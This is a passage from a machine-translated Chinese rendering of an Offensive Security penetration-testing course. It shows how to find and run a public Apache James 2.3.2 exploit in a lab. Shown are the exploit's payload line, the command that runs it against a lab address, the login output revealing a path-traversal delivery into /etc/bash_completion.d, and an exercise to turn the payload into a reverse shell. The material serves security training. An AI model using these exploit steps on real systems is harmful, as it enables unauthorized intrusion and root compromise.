<div style="position:absolute;top:12833;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">小路</font></font></nobr></div>
<div style="position:absolute;top:12850;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">(/usr/share/exploitdb/)</font></font></nobr></div>
<div style="position:absolute;top:12867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------- ----------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:12884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache James Server 2.2 - SMTP 拒绝 | </font><font style="vertical-align: inherit;">漏洞利用/多个/dos/27915.pl</font></font></nobr></div>
<div style="position:absolute;top:12901;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache James Server 2.3.2 - 远程通讯 | </font><font style="vertical-align: inherit;">漏洞利用/linux/remote/35513.py</font></font></nobr></div>
<div style="position:absolute;top:12918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WheresJames Webcam Publisher Beta 2.0。</font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/944.c</font></font></nobr></div>
<div style="position:absolute;top:12935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------- ----------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:12954;left:234"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 421 - 使用 searchsploit 搜索针对 Apache James 的漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:12984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在结果中，似乎其中一个漏洞是针对特定的 Apache James</font></font></nobr></div>
<div style="position:absolute;top:13003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器版本 2.3.2。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">378</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快速浏览一下这个漏洞，表明它以 IP 地址作为</font></font></nobr></div>
<div style="position:absolute;top:13023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数并以 root 身份执行特定命令，该命令在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量中</font><font style="vertical-align: inherit;">定义</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload = ' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[ "$(id -u)" == "0" ] &amp;&amp; touch /root/proof.txt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ' # 仅在 root 上利用</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:13115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">378 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2014 年），https://www.exploit-db.com/exploits/35513</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:13243;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="12"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 12 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:13276;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:14353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:14353;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:14353;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">453</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13372;left:261"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 422 - 在利用时以 root 用户身份执行的有效负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经找到了我们的漏洞，我们将尝试在我们的专用 Linux 客户端上运行它</font></font></nobr></div>
<div style="position:absolute;top:13420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有任何修改。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python /usr/share/exploitdb/exploits/linux/remote/35513.py 10.11.0.128</font></font></font></b></nobr></div>
<div style="position:absolute;top:13472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+]连接到 James 远程管理工具...</font></font></nobr></div>
<div style="position:absolute;top:13489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+]正在创建用户...</font></font></nobr></div>
<div style="position:absolute;top:13506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+]连接到 James SMTP 服务器...</font></font></nobr></div>
<div style="position:absolute;top:13523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+]发送有效载荷...</font></font></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:13540;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+]完成！</font><font style="vertical-align: inherit;">一旦有人登录，Payload 将被执行。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13560;left:269"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 423 - 针对我们的专用 Linux 客户端运行漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该漏洞利用似乎没有任何错误，它通知我们有效载荷将</font></font></nobr></div>
<div style="position:absolute;top:13608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦有人登录到机器就执行。</font></font></nobr></div>
<div style="position:absolute;top:13641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们连接到我们的专用 Linux 客户端来模拟通常会从</font></font></nobr></div>
<div style="position:absolute;top:13661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受害者并注意到我们得到了额外的混乱（来自漏洞利用），这在一次攻击期间不会发生</font></font></nobr></div>
<div style="position:absolute;top:13680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准登录会话：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh root@10.11.0.128</font></font></font></b></nobr></div>
<div style="position:absolute;top:13732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@10.11.0.128 的密码： </font></font></nobr></div>
<div style="position:absolute;top:13748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:13765;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317003\ぬ': co</font></font></b></nobr></div>
<div style="position:absolute;top:13783;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mm 没有找到</font></font></b></nobr></div>
<div style="position:absolute;top:13800;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: L: 命令未找到</font></font></b></nobr></div>
<div style="position:absolute;top:13816;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: attributestLjava/util/HashMap: 没有那个文件或目录</font></font></b></nobr></div>
<div style="position:absolute;top:13833;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: L</font></font></b></nobr></div>
<div style="position:absolute;top:13850;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">errorMessagetLjava/lang/String: 没有那个文件或目录</font></font></b></nobr></div>
<div style="position:absolute;top:13867;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: L</font></font></b></nobr></div>
<div style="position:absolute;top:13884;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lastUpdatedtLjava/util/Date: 没有那个文件或目录</font></font></b></nobr></div>
<div style="position:absolute;top:13901;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: Lmessaget!Ljavax/mail/internet/MimeMessage: 没有那个文件或目录</font></font></b></nobr></div>
<div style="position:absolute;top:13918;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: $'L\004nameq~\002L': 命令未找到</font></font></b></nobr></div>
<div style="position:absolute;top:13935;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash：recipientstLjava/util/Collection：没有那个文件或目录</font></font></b></nobr></div>
<div style="position:absolute;top:13952;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: L: 命令未找到</font></font></b></nobr></div>
<div style="position:absolute;top:13969;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: $'remoteAddrq~\002L': 命令未找到</font></font></b></nobr></div>
<div style="position:absolute;top:13986;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: 没有那个文件或目录</font></font></b></nobr></div>
<div style="position:absolute;top:14003;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': comm</font></font></b></nobr></div>
<div style="position:absolute;top:14020;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并没有找到</font></font></b></nobr></div>
<div style="position:absolute;top:14037;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': 命令未找到</font></font></b></nobr></div>
<div style="position:absolute;top:14054;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash：@team.pl&gt;</font></font></b></nobr></div>
<div style="position:absolute;top:14071;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">消息 ID：&lt;31878267.0.1555158659200.JavaMail.root@debian&gt;</font></font></b></nobr></div>
<div style="position:absolute;top:14088;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MIME 版本：1.0</font></font></b></nobr></div>
<div style="position:absolute;top:14105;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容类型：文本/纯文本；</font><font style="vertical-align: inherit;">字符集=us-ascii</font></font></b></nobr></div>
<div style="position:absolute;top:14122;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容传输编码：7 位</font></font></b></nobr></div>
<div style="position:absolute;top:14139;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交付至：../../../../../../../../etc/bash_completion.d@localhost</font></font></b></nobr></div>
<div style="position:absolute;top:14156;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收到：来自 vpn.hacker.localdomain ([10.11.11.10])</font></font></b></nobr></div>
<div style="position:absolute;top:14173;left:190"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由 debian (JAMES SMTP Server 2.3.2) 与 SMTP ID 330</font></font></b></nobr></div>
<div style="position:absolute;top:14190;left:190"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于 &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;;</font></font></b></nobr></div>
<div style="position:absolute;top:14207;left:190"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019 年 4 月 13 日星期六 08:30:53 -0400 (EDT)</font></font></b></nobr></div>
<div style="position:absolute;top:14224;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日期：2019 年 4 月 13 日星期六 08:30:53 -0400 (EDT)</font></font></b></nobr></div>
<div style="position:absolute;top:14241;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自：team@team.pl</font></font></b></nobr></div>
<div style="position:absolute;top:14275;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">： 没有相应的文件和目录</font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:14431;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="13"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 13 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:14464;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:15541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:15541;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:15541;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">454</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:14560;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-bash: $'\r': 命令未找到</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:14576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font></nobr></div>
<div style="position:absolute;top:14596;left:215"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 424 - 使用 SSH 登录到专用 Linux 客户端来模拟受害者</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:14626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果一切按计划进行，我们应该会在 /root 目录下看到一个 proof.txt 文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:14660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -lah /root/proof.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:14677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根根 0 Apr 13 08:34 /root/proof.txt</font></font></nobr></div>
<div style="position:absolute;top:14696;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 425 - 验证登录机器时是否执行了有效负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:14726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常好。</font><font style="vertical-align: inherit;">看起来漏洞利用是成功的。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:14760;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.3.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:14790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 连接到您的专用 Linux 客户端并使用以下命令启动易受攻击的 Apache James 服务</font></font></nobr></div>
<div style="position:absolute;top:14810;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/local/james/bin/run.sh 脚本。</font></font></nobr></div>
<div style="position:absolute;top:14838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用端口扫描实用程序枚举目标并使用横幅和</font></font></nobr></div>
<div style="position:absolute;top:14858;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Internet 搜索以确定机器上运行的软件。</font></font></nobr></div>
<div style="position:absolute;top:14886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具</font><font style="vertical-align: inherit;">在</font><i><font style="vertical-align: inherit;">上面</font></i><font style="vertical-align: inherit;">提到的在线资源上找到这个版本的漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:14905;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个模块中。</font></font></nobr></div>
<div style="position:absolute;top:14933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 启动exploit并验证payload在登录机器时被执行。</font></font></nobr></div>
<div style="position:absolute;top:14962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 尝试修改</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量以获得目标机器上的反向shell。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:14999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.4 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:15040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们讨论了与运行不受信任的作者编写的代码相关的风险。</font></font></nobr></div>
<div style="position:absolute;top:15060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还介绍了托管公开漏洞利用代码的各种在线资源</font></font></nobr></div>
<div style="position:absolute;top:15079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及不需要 Internet 连接的离线资源。</font><font style="vertical-align: inherit;">最后，我们介绍了一个</font></font></nobr></div>
<div style="position:absolute;top:15099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">展示如何使用此类在线资源查找软件公开漏洞的场景</font></font></nobr></div>
<div style="position:absolute;top:15118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在针对目标的枚举阶段发现的版本。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:15619;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="14"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 14 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:15652;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:16729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:16729;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:16729;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">455</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:15742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.4.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:15768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15. 修复漏洞</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:15812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从头开始编写漏洞利用程序可能既困难又耗时。</font><font style="vertical-align: inherit;">但这可能同样困难</font></font></nobr></div>
<div style="position:absolute;top:15832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且在参与过程中找到适合我们确切需求的公共漏洞非常耗时。</font><font style="vertical-align: inherit;">一</font></font></nobr></div>
<div style="position:absolute;top:15851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最大的妥协是修改公共漏洞以适应我们的特定需求。</font></font></nobr></div>
<div style="position:absolute;top:15884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，此解决方案存在挑战。</font><font style="vertical-align: inherit;">在内存损坏的情况下，例如</font></font></nobr></div>
<div style="position:absolute;top:15903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区溢出，我们可能需要修改基本的目标参数，例如套接字信息，</font></font></nobr></div>
<div style="position:absolute;top:15923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回地址、有效载荷和偏移量。</font></font></nobr></div>
<div style="position:absolute;top:15956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解这些元素中的每一个都非常重要。</font><font style="vertical-align: inherit;">例如，如果我们的目标正在运行</font></font></nobr></div>
<div style="position:absolute;top:15975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 2008 Server 并且我们尝试运行针对其编写和测试的漏洞</font></font></nobr></div>
<div style="position:absolute;top:15994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 2003 Server，较新的保护机制（例如 ASLR）很可能会导致</font></font></nobr></div>
<div style="position:absolute;top:16013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序崩溃，这可能会在一段时间内锁定该攻击向量或影响</font></font></nobr></div>
<div style="position:absolute;top:16033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生产环境，这两种情况我们都应该避免。</font></font></nobr></div>
<div style="position:absolute;top:16066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑到这一点，我们应该始终阅读漏洞利用代码，而不是触发不匹配的漏洞利用代码</font></font></nobr></div>
<div style="position:absolute;top:16085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仔细地，根据需要修改它，并尽可能针对我们自己的沙盒目标进行测试。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:16147;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些变量解释了为什么像 Exploit Database </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">379</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机</font><font style="vertical-align: inherit;">这样的在线资源</font></font></i></nobr></div>
<div style="position:absolute;top:16166;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对同一漏洞的多个漏洞利用，每个漏洞针对不同的目标编写</font></font></i></nobr></div>
<div style="position:absolute;top:16186;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统版本和架构。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:16248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们也可能受益于将漏洞利用移植到不同的语言以包含额外的</font></font></nobr></div>
<div style="position:absolute;top:16267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预先编写的库并通过将其导入攻击框架来扩展漏洞利用功能。</font></font></nobr></div>
<div style="position:absolute;top:16300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，编码为在特定操作系统和架构上运行的漏洞可能需要</font></font></nobr></div>
<div style="position:absolute;top:16319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移植到不同的平台。</font><font style="vertical-align: inherit;">例如，我们经常遇到漏洞利用的情况</font></font></nobr></div>
<div style="position:absolute;top:16339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要在 Windows 上编译，但我们想在 Kali 上运行它。</font></font></nobr></div>
<div style="position:absolute;top:16371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本单元中，我们将在逐步完成所需的步骤时克服其中的许多挑战</font></font></nobr></div>
<div style="position:absolute;top:16391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修改公共漏洞利用代码以适应特定的攻击平台和目标。</font><font style="vertical-align: inherit;">我们将探索两者</font></font></nobr></div>
<div style="position:absolute;top:16410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存损坏漏洞利用和网络漏洞利用。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:16447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1 修复内存损坏漏洞</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:16489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存损坏漏洞（例如缓冲区溢出）相对复杂且难以</font></font></nobr></div>
<div style="position:absolute;top:16508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调整。</font><font style="vertical-align: inherit;">在我们跳入一个例子之前，我们应该讨论这个过程并强调一些</font></font></nobr></div>
<div style="position:absolute;top:16528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将面临的考虑和挑战。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:16679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">379 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.exploit-db.com</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:16807;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="15"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 15 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:16840;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:17917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:17917;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:17917;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">456</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:16936;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:16936;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">概述和注意事项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
